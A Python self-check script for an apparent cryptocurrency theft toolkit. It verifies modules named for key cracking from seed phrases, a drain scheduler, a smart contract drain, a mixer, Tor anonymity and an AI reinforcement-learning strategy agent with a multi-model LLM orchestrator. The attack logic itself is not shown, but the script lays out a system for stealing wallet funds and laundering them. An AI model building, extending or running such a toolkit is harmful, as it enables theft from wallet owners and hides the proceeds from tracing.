#!/usr/bin/env python3
"""Verify all crypto automation components are working."""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

ok = True

print("=== Crypto Automation — Verification ===\n")

# 1. Core imports
print("[1/8] Core imports...")
try:
    from web3 import Web3; print("  ✅ web3")
    from ecdsa import SigningKey, SECP256k1; print("  ✅ ecdsa")
    from mnemonic import Mnemonic; print("  ✅ mnemonic")
    from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins; print("  ✅ bip-utils")
    from solders.keypair import Keypair; print("  ✅ solders")
    from solana.rpc.api import Client; print("  ✅ solana")
    print("  ✅ All core imports OK")
except ImportError as e:
    print(f"  ❌ {e}")
    ok = False

# 2. Chain handlers
print("\n[2/8] Chain handlers...")
try:
    from chain_handlers.eth_handler import ETHHandler
    h = ETHHandler("eth")
    if h.is_connected(): print("  ✅ ETH connected")
    else: print("  ❌ ETH not connected"); ok = False
    
    hb = ETHHandler("bsc")
    if hb.is_connected(): print("  ✅ BSC connected")
    else: print("  ❌ BSC not connected"); ok = False
except Exception as e:
    print(f"  ❌ ETH/BSC: {e}"); ok = False

try:
    from chain_handlers.btc_handler import BTCHandler
    h = BTCHandler()
    if h.is_connected(): print("  ✅ BTC connected")
    else: print("  ❌ BTC not connected"); ok = False
except Exception as e:
    print(f"  ❌ BTC: {e}"); ok = False

try:
    from chain_handlers.sol_handler import SOLHandler
    h = SOLHandler()
    if h.is_connected(): print("  ✅ SOL connected")
    else: print("  ❌ SOL not connected"); ok = False
except Exception as e:
    print(f"  ❌ SOL: {e}"); ok = False

# 3. Key cracking
print("\n[3/8] Key cracking...")
try:
    from scanner.key_cracker import crack_from_seed_phrase
    r = crack_from_seed_phrase("abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about")
    if r and "eth" in r.get("chains", {}): print("  ✅ BIP39 cracking")
    else: print("  ❌ BIP39 cracking failed"); ok = False
except Exception as e:
    print(f"  ❌ BIP39: {e}"); ok = False

# 4. Drain scheduler
print("\n[4/8] Drain scheduler...")
try:
    from drainer.drain_scheduler import DrainScheduler
    s = DrainScheduler()
    gas = s.check_gas_prices()
    if gas.get("eth"): print(f"  ✅ Gas prices: ETH={gas['eth']}gwei, BSC={gas.get('bsc')}gwei")
    else: print("  ❌ Gas check failed"); ok = False
except Exception as e:
    print(f"  ❌ Drain: {e}"); ok = False

# 5. Smart contract drain
print("\n[5/8] Smart contract drain...")
try:
    from drainer.smart_contract_drain import SmartContractDrain
    scd = SmartContractDrain("eth")
    print(f"  ✅ SmartContractDrain ({scd.chain})")
except Exception as e:
    print(f"  ❌ SCD: {e}"); ok = False

# 6. Mixer
print("\n[6/8] Mixer...")
try:
    from mixer.mixer_engine import MixerEngine
    m = MixerEngine()
    plan = m.plan_mix("eth", 100)
    print(f"  ✅ Mixer ({plan['total_hops']} hops)")
except Exception as e:
    print(f"  ❌ Mixer: {e}"); ok = False

# 7. Tor
print("\n[7/8] Tor...")
try:
    from network.tor_manager import get_tor
    t = get_tor()
    if t._check_running(): print("  ✅ Tor running")
    else: print("  ❌ Tor not running"); ok = False
except Exception as e:
    print(f"  ❌ Tor: {e}"); ok = False

# 8. AI & RL
print("\n[8/8] AI/RL...")
try:
    from ai_agent.learning_loop import StrategyRL
    rl = StrategyRL()
    s = rl.get_stats()
    print(f"  ✅ StrategyRL ({s['active_strategies']} strategies)")
except Exception as e:
    print(f"  ❌ StrategyRL: {e}"); ok = False

try:
    from ai_agent.llm_provider import MultiModelOrchestrator
    llm = MultiModelOrchestrator()
    print(f"  ✅ MultiModelOrchestrator ({len(llm.routes)} routes)")
except Exception as e:
    print(f"  ❌ MultiModel: {e}"); ok = False

print(f"\n{'='*50}")
print(f"OVERALL: {'✅ ALL CHECKS PASSED' if ok else '❌ SOME CHECKS FAILED'}")
print(f"{'='*50}")
sys.exit(0 if ok else 1)
